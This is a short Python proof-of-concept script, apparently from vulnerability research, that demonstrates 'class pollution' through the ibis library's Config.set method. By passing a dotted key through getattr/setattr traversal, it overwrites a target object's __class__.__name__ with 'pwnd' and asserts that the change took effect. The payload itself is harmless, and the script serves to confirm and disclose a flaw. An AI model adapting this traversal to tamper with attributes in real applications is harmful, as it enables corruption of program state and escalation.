# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: Config.set
# Type: get-attr-set-attr

import ibis

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "target.__class__.__name__"

def run_poc():
  # ibis.options is a Config instance with a .set(key, value) method
  # that splits key on "." and traverses via getattr then setattr
  ibis.options.target = target
  ibis.options.set(PAYLOAD, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
